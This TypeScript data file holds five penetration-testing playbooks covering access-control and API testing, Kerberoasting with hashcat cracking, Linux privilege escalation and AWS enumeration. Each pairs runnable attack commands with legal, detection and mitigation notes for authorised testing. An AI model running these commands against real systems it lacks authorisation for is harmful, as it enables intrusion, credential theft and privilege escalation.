import type { Playbook } from "./hacking";

const LEGAL =
  "Use only against systems you own or have explicit written authorisation to test. Unauthorised use violates the CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide.";

export const EXTRA2_PLAYBOOKS: Playbook[] = [
  {
    slug: "broken-access-control",
    title: "OWASP A1: Broken Access Control",
    category: "Web",
    severity: "critical",
    cve: ["CWE-284", "CWE-639"],
    mitreAttack: ["T1190", "T1078"],
    summary:
      "Test whether authenticated and unauthenticated users can reach objects or actions they do not own by changing identifiers, paths, roles, or hidden parameters.",
    prerequisites: [
      "At least two accounts in scope with different privilege levels",
      "Intercepting proxy access to capture and replay requests",
      "Explicit authorization to test access control and forced browsing",
    ],
    toolSlugs: ["burpsuite", "ffuf", "curl"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Map object references and role boundaries",
        detail:
          "Proxy normal user workflows through Burp and note every object identifier, tenant ID, role value, feature flag, and administrative path. Access control flaws usually appear when the same endpoint accepts both direct object IDs and role hints from the client.",
        commands: [
          {
            code: "# Burp Proxy/HTTP history: capture requests for profile, invoices, orders, admin panels, and file downloads",
            note: "Build a list of candidate endpoints before modifying anything.",
          },
        ],
      },
      {
        title: "Test IDOR and BOLA by swapping identifiers",
        detail:
          "Replay the same request while changing numeric IDs, UUIDs, account numbers, or tenant keys to values owned by the second account. Compare full responses, not just status codes.",
        commands: [
          {
            code: "curl -isk -H 'Cookie: session=USERA' 'https://app.example.com/api/orders/10024'",
            note: "Baseline the owner response first.",
          },
          {
            code: "curl -isk -H 'Cookie: session=USERA' 'https://app.example.com/api/orders/10025'",
            note: "A 200 with another user's data is classic IDOR/BOLA evidence.",
          },
        ],
      },
      {
        title: "Fuzz forced-browse and hidden administrative paths",
        detail:
          "Enumerate sensitive routes that the UI hides but the backend may still serve. Pay attention to 401, 403, and 200 responses that differ in size from the public baseline.",
        commands: [
          {
            code: "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://app.example.com/FUZZ -mc 200,204,301,302,307,401,403 -fs 0",
            note: "Look for admin, internal, export, or backup routes that should not be reachable.",
          },
        ],
      },
      {
        title: "Manipulate role and privilege parameters",
        detail:
          "Tamper with client-supplied role names, plan IDs, booleans such as isAdmin, or HTTP headers used by upstream middleware. Many broken access controls happen because the server trusts those values instead of deriving them from the session.",
        commands: [
          {
            code: "curl -isk -X PATCH 'https://app.example.com/api/profile/10024' -H 'Cookie: session=USERA' -H 'Content-Type: application/json' --data '{\"role\":\"admin\",\"isAdmin\":true}'",
            note: "Watch for privilege elevation or hidden features becoming available.",
          },
        ],
      },
      {
        title: "Cross-check using two-account replay",
        detail:
          "Use Burp Repeater or a second browser session to verify whether Account B can reach or mutate Account A resources and vice versa. Repeat the test for GET, POST, PATCH, and DELETE, because authorization often differs by verb.",
        commands: [
          {
            code: "curl -isk -X DELETE 'https://app.example.com/api/users/10024/api-keys/7' -H 'Cookie: session=USERB'",
            note: "Unsafe state-changing access across accounts turns an information leak into a critical integrity issue.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "403 Forbidden on every modified request",
        cause:
          "The authorization control may be working correctly, or you are hitting only one enforcement layer.",
        fix: "Retest with other verbs, background APIs, download routes, and nested object IDs before concluding the feature is safe.",
      },
      {
        message: "200 OK but same sanitized body for every object ID",
        cause:
          "The application uses a uniform error wrapper that hides authorization failures behind a success code.",
        fix: "Diff the body size, fields, and timestamps carefully, and use -i/-k curl output or Burp Comparer to separate real object access from decoy responses.",
      },
      {
        message: "429 Too Many Requests during path fuzzing",
        cause: "Rate limiting or WAF controls triggered while probing forced-browse candidates.",
        fix: "Slow the ffuf thread count, add delays, and continue manually against the highest-value paths only.",
      },
    ],
    detection:
      "Look for one session requesting many adjacent object IDs, repeated 401/403/200 transitions on admin routes, and authorization failures logged against objects owned by other users or tenants.",
    mitigation:
      "Enforce server-side authorization on every object and action, derive roles from the authenticated session only, scope database queries by owner or tenant, and add integration tests that verify horizontal and vertical access boundaries for every endpoint and HTTP verb.",
  },
  {
    slug: "kerberoasting",
    title: "Active Directory Kerberoasting",
    category: "Active Directory",
    severity: "high",
    cve: ["CWE-522"],
    mitreAttack: ["T1558.003"],
    summary:
      "Request service tickets for SPN-bearing accounts, export crackable TGS material, recover weak service passwords offline, and validate the resulting privileges while documenting detection opportunities.",
    prerequisites: [
      "A valid domain user account",
      "Reachability to a domain controller on Kerberos and LDAP",
      "A wordlist and GPU or CPU cracking host for offline recovery",
    ],
    toolSlugs: ["impacket-getuserspns", "hashcat", "kerbeus"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Enumerate roastable SPNs with Impacket",
        detail:
          "Use any valid domain credential to request TGS tickets for accounts that have service principal names. Save the output directly in a crackable file so you do not lose formatting.",
        commands: [
          {
            code: "impacket-GetUserSPNs -request corp.local/jdoe:'Winter2024!' -dc-ip 10.10.10.10 -outputfile spns.tgs",
            note: "Produces hashcat-ready TGS material for SPN-bearing accounts.",
          },
        ],
      },
      {
        title: "Crack the recovered service tickets",
        detail:
          "Use hashcat mode 13100 against the ticket file and start with a strong dictionary plus a compact rule set. Expand to masks only if policy or naming hints justify it.",
        commands: [
          {
            code: "hashcat -m 13100 -a 0 spns.tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            note: "Standard Kerberoast offline cracking workflow.",
          },
          {
            code: "hashcat -m 13100 spns.tgs --show",
            note: "Print recovered service account passwords from the potfile.",
          },
        ],
      },
      {
        title: "Validate and triage cracked service accounts",
        detail:
          "Once a password is recovered, check what that service account can access. Service accounts often have local admin on the system they run on or delegated privileges in the domain.",
        commands: [
          {
            code: "crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'Spring2024!' --shares",
            note: "Quickly test whether the cracked credential has lateral movement value.",
          },
        ],
      },
      {
        title: "Cross-check from a Windows perspective with Rubeus",
        detail:
          "On a Windows foothold in a lab or approved engagement, Rubeus provides a native alternative for ticket requests and visibility into Kerberos behavior.",
        commands: [
          {
            code: "Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt",
            note: "Collect TGS material natively from a Windows host.",
          },
        ],
      },
      {
        title: "Document detection and mitigation evidence",
        detail:
          "Record the ticket request spike, the SPN-bearing accounts involved, password complexity observations, and whether RC4 or weak service credentials made cracking feasible.",
        commands: [
          {
            code: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} | Select-Object -First 20",
            note: "Security event 4769 is the key detection trail for Kerberoasting activity.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "KRB_AP_ERR_SKEW",
        cause: "The attacking host and the domain controller differ too much in system time.",
        fix: "Sync time with the DC before retrying the Kerberos request workflow.",
      },
      {
        message: "No entries found!",
        cause:
          "No SPN-bearing accounts were returned, or the supplied account could not query the directory successfully.",
        fix: "Confirm LDAP reachability, verify the credential works, and retry against the correct domain controller.",
      },
      {
        message: "Token length exception in hashcat mode 13100",
        cause: "The TGS file was reformatted, truncated, or exported in the wrong mode.",
        fix: "Regenerate the ticket file directly from GetUserSPNs or Rubeus and keep one intact hash per line.",
      },
    ],
    detection:
      "Monitor Security event 4769 for bursts of TGS requests from a single user, especially for many distinct SPNs or for RC4-backed service tickets that are uncommon in the environment.",
    mitigation:
      "Use long random passwords or gMSAs for service accounts, remove unnecessary SPNs, disable RC4 where possible, and alert on abnormal TGS request patterns from low-privileged users.",
  },
  {
    slug: "api-security-testing",
    title: "API Security Testing",
    category: "Web",
    severity: "high",
    cve: ["CWE-306", "CWE-639", "CWE-915"],
    mitreAttack: ["T1190"],
    summary:
      "Assess REST and JSON APIs for hidden endpoints, authentication bypass, BOLA/IDOR, mass assignment, and weak request validation.",
    prerequisites: [
      "A scoped API base URL and at least one valid account if authentication is required",
      "Burp Suite or another proxy to capture raw requests",
      "Wordlists for endpoint and parameter discovery",
    ],
    toolSlugs: ["ffuf", "burpsuite", "curl", "arjun"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Discover endpoints and versions",
        detail:
          "Start with predictable paths, version prefixes, and hidden documentation routes. APIs frequently expose undocumented admin or internal endpoints behind predictable naming.",
        commands: [
          {
            code: "ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://api.example.com/FUZZ -mc 200,204,301,302,401,403 -fs 0",
            note: "Find likely API routes such as /v1/admin, /internal, /graphql, or /swagger.",
          },
        ],
      },
      {
        title: "Enumerate hidden parameters",
        detail:
          "Use Arjun or manual replay to discover undocumented query and body parameters that may switch behavior, enable debug output, or affect authorization.",
        commands: [
          {
            code: "arjun -u https://api.example.com/v1/users --get -oT arjun-users.txt",
            note: "Probe for hidden GET parameters quickly.",
          },
          {
            code: "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://api.example.com/v1/users?FUZZ=test' -fs 4242",
            note: "Cross-check manual parameter fuzzing against the same endpoint.",
          },
        ],
      },
      {
        title: "Test authentication and authorization boundaries",
        detail:
          "Replay captured requests without tokens, with another user's token, and with tampered JWT claims or role headers where permitted. Compare both response bodies and side effects.",
        commands: [
          {
            code: "curl -isk https://api.example.com/v1/orders/10025 -H 'Cookie: api_session=alice-session'",
            note: "Baseline response for a valid owner's object.",
          },
          {
            code: "curl -isk https://api.example.com/v1/orders/10026 -H 'Cookie: api_session=alice-session'",
            note: "BOLA/IDOR if another user's object becomes readable or writable.",
          },
        ],
      },
      {
        title: "Probe for mass assignment",
        detail:
          "Inject fields that should be server-controlled such as role, status, account_balance, tenant_id, or is_admin. APIs that blindly bind JSON objects often accept more than the client UI exposes.",
        commands: [
          {
            code: 'curl -isk -X PATCH https://api.example.com/v1/users/me -H \'Cookie: api_session=alice-session\' -H \'Content-Type: application/json\' --data \'{"display_name":"alice","role":"admin","is_admin":true}\'',
            note: "Unexpected acceptance of privileged fields is a mass-assignment finding.",
          },
        ],
      },
      {
        title: "Validate with Burp Repeater and compare responses",
        detail:
          "Once a suspect issue is found, replay the exact request in Burp, remove irrelevant headers, and confirm the minimum change that triggers the vulnerability. This avoids false positives from stale auth or caches.",
        commands: [
          {
            code: "# Burp Repeater: resend the same JSON request with and without the injected field set",
            note: "Capture clear before/after evidence for the report.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "401 Unauthorized on every tampered request",
        cause:
          "The token may be expired, malformed, or removed by a proxy rather than the endpoint properly enforcing authorization.",
        fix: "Recapture a fresh authenticated request first, then repeat each test from a known-good baseline.",
      },
      {
        message: "415 Unsupported Media Type",
        cause:
          "The API expects JSON or another specific content type and rejected the fuzzed request body.",
        fix: "Set the correct Content-Type header exactly as captured from the working client request.",
      },
      {
        message: "429 Too Many Requests during endpoint discovery",
        cause: "Rate limiting triggered while fuzzing paths or parameters.",
        fix: "Lower thread count, add pacing, and continue manually against high-value routes only.",
      },
    ],
    detection:
      "Watch for one user token requesting many object IDs, sudden spikes in 401/403 responses on undocumented endpoints, and unexpected sensitive fields appearing in request bodies handled by update routes.",
    mitigation:
      "Enforce object-level authorization on every request, use allow-lists for bindable JSON fields, validate HTTP methods and content types strictly, and include automated tests for BOLA/IDOR and mass-assignment regressions in the API CI pipeline.",
  },
  {
    slug: "linux-privesc",
    title: "Linux Privilege Escalation",
    category: "Privilege Escalation",
    severity: "high",
    cve: ["CWE-250", "CWE-269", "CWE-732"],
    mitreAttack: ["T1548", "T1068"],
    summary:
      "Systematically enumerate and validate local Linux privilege escalation paths including sudo misconfigurations, SUID/SGID binaries, cron jobs, writable paths, and kernel exposure.",
    prerequisites: [
      "An authorized non-root shell on the Linux host",
      "Ability to upload or execute local enumeration scripts if permitted",
      "Approval for local privilege escalation testing on the target system",
    ],
    toolSlugs: ["linpeas", "linenum", "find", "sudo"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Run fast automated enumeration",
        detail:
          "Start with LinPEAS or LinEnum to surface weak permissions, sudo rules, cron jobs, capabilities, containers, and known local misconfigurations quickly.",
        commands: [
          {
            code: "linpeas.sh",
            note: "LinPEAS highlights likely privilege escalation vectors in color.",
          },
          {
            code: "LinEnum.sh -t",
            note: "LinEnum provides a second opinion with a lighter report format.",
          },
        ],
      },
      {
        title: "Review sudo rights manually",
        detail:
          "Check whether the current user can run commands as root or another privileged user without a password. Even a single allowed binary can be enough for escalation.",
        commands: [
          {
            code: "sudo -l",
            note: "Look for NOPASSWD entries, wildcards, or dangerous interpreters such as vim, less, tar, or python.",
          },
        ],
      },
      {
        title: "Find SUID and SGID binaries",
        detail:
          "Search the filesystem for privileged binaries and compare unusual entries against GTFOBins or expected package defaults. Custom vendor binaries are especially valuable.",
        commands: [
          {
            code: "find / -perm -4000 -type f 2>/dev/null",
            note: "List SUID binaries accessible on the host.",
          },
          {
            code: "find / -perm -2000 -type f 2>/dev/null",
            note: "List SGID binaries that may lead to file or group-based escalation.",
          },
        ],
      },
      {
        title: "Inspect cron jobs and writable execution paths",
        detail:
          "Check system-wide cron schedules, PATH usage, and writable scripts or directories. Many real-world privescs come from root cron tasks calling user-writable scripts or unqualified binaries.",
        commands: [
          {
            code: "cat /etc/crontab && ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly",
            note: "Look for root jobs executing writable files or commands without full paths.",
          },
          {
            code: "find / -writable -type d 2>/dev/null | grep -E '^/(tmp|var/tmp|dev/shm|opt|usr/local|home)'",
            note: "Writable directories in execution paths are often exploitable.",
          },
        ],
      },
      {
        title: "Validate kernel and software exposure safely",
        detail:
          "Record the kernel version, distro release, and container context. Match the host against known local privilege escalation CVEs only after confirming exploit preconditions in a controlled manner.",
        commands: [
          {
            code: "uname -a && cat /etc/os-release",
            note: "Capture the exact kernel and distribution details before researching exploitability.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "sudo: a password is required",
        cause:
          "The current user has sudo rights but not NOPASSWD rights for the attempted command.",
        fix: "Re-run only the commands listed under sudo -l or pivot to another local vector such as SUID, cron, or writable paths.",
      },
      {
        message: "find: '/root': Permission denied",
        cause: "The current low-privilege shell cannot read root-owned directories directly.",
        fix: "Expected during enumeration; keep scanning readable paths and use sudo/SUID findings instead of forcing access.",
      },
      {
        message: "linpeas.sh: /bin/sh^M: bad interpreter",
        cause: "The enumeration script was transferred with Windows line endings.",
        fix: "Convert the file with dos2unix or re-download it in Unix format before executing.",
      },
    ],
    detection:
      "Alert on unusual execution of enumeration scripts, repeated sudo -l usage from non-admin accounts, reads of cron and shadow-adjacent files, and unexpected process creation from SUID binaries or writable service paths.",
    mitigation:
      "Minimize sudo to least privilege, remove unnecessary SUID/SGID bits, use absolute paths in cron and service files, lock down writable directories, and patch kernels and userland software on a regular cadence.",
  },
  {
    slug: "aws-enum",
    title: "Cloud AWS Enumeration",
    category: "Post-Exploitation",
    severity: "high",
    cve: ["CWE-200", "CWE-269"],
    mitreAttack: ["T1526", "T1580"],
    summary:
      "Enumerate an AWS environment with approved credentials to identify reachable accounts, identities, storage exposure, IAM relationships, and privilege-escalation paths.",
    prerequisites: [
      "AWS API credentials or an attached instance/profile already in scope",
      "Permission to enumerate the target AWS account or organization",
      "AWS CLI configured locally or access to a scoped cloud shell",
    ],
    toolSlugs: ["aws-cli", "pacu", "scoutsuite"],
    legalNote: LEGAL,
    steps: [
      {
        title: "Validate identity and account context",
        detail:
          "Before broad enumeration, confirm exactly which principal and account you are using. This prevents accidental cross-account activity and gives you the ARN needed for policy analysis.",
        commands: [
          {
            code: "aws sts get-caller-identity",
            note: "Returns the current account ID, user or role ARN, and principal ID.",
          },
        ],
      },
      {
        title: "Enumerate S3 exposure",
        detail:
          "List buckets visible to the current principal and test whether unauthenticated or over-permissive bucket access exists where appropriate. Bucket names often reveal environments, backups, and internal applications.",
        commands: [
          {
            code: "aws s3api list-buckets --query 'Buckets[].Name' --output text",
            note: "Gather the visible S3 bucket inventory first.",
          },
          {
            code: "aws s3 ls s3://example-public-bucket --no-sign-request",
            note: "Check whether a candidate bucket is anonymously listable.",
          },
        ],
      },
      {
        title: "Map IAM users, roles, and attached policies",
        detail:
          "List principals, then inspect inline and attached policies for wildcard actions, passrole rights, and privilege-escalation opportunities such as iam:CreatePolicyVersion or sts:AssumeRole.",
        commands: [
          {
            code: "aws iam list-users",
            note: "Enumerate IAM users in the current account.",
          },
          {
            code: "aws iam list-roles",
            note: "Enumerate assumable roles that may be chainable.",
          },
          {
            code: "aws iam list-attached-user-policies --user-name audit-user",
            note: "Check directly attached policies on a specific principal.",
          },
        ],
      },
      {
        title: "Use Pacu for guided AWS post-exploitation enumeration",
        detail:
          "Load the approved keys into Pacu and run read-only IAM-focused modules to highlight escalation paths and risky relationships faster than manual review alone.",
        commands: [
          {
            code: "pacu",
            note: "Start a Pacu session and import the scoped credentials.",
          },
          {
            code: "run iam__enum_permissions",
            note: "Inside Pacu, enumerate what the current principal can actually do.",
          },
        ],
      },
      {
        title: "Generate a broad configuration report with ScoutSuite",
        detail:
          "Use ScoutSuite for a snapshot of cloud exposures across IAM, storage, networking, logging, and service configuration. Its HTML output makes it easy to hand findings to defenders.",
        commands: [
          {
            code: "scout aws --report-dir scoutsuite-aws",
            note: "Produce a browsable report using the currently configured AWS credentials.",
          },
        ],
      },
    ],
    errors: [
      {
        message: "An error occurred (AccessDenied) when calling the ListUsers operation",
        cause: "The current IAM principal lacks permission for the requested enumeration API call.",
        fix: "Record the denied action, continue with allowed read-only APIs, and note the effective permission boundary in the report.",
      },
      {
        message: "Unable to locate credentials",
        cause:
          "AWS CLI or Pacu has no configured keys, token, or instance-profile credentials available.",
        fix: "Run aws configure, export AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY, or verify the in-scope role is attached to the compute instance.",
      },
      {
        message: "botocore.exceptions.NoCredentialsError",
        cause: "Pacu started without imported AWS credentials for the active session.",
        fix: "Use Pacu's set_keys or import_keys workflow before running enumeration modules.",
      },
    ],
    detection:
      "CloudTrail should show sts:GetCallerIdentity followed by bursts of iam:List*, s3:List*, and describe-style API calls from the same principal or source IP. Unusual read-heavy enumeration from a workload role is often the first sign of misuse.",
    mitigation:
      "Apply least privilege to IAM principals, enable CloudTrail and GuardDuty in every region, block public S3 access at the account level, and use SCPs and permissions boundaries to prevent common IAM privilege-escalation actions.",
  },
];
